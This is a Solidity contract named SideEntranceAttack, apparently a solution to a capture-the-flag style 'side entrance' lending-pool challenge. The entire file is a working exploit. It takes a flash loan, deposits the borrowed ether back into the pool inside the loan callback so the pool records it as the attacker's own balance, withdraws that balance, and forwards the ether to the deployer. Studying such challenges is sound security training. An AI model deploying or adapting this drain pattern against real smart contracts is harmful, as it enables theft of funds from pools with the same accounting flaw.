// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool private immutable pool;
    address private immutable owner;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        owner = msg.sender;
    }

    function attack(uint256 amount) external payable {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    fallback() external payable {
        payable(owner).transfer(msg.value);
    }
}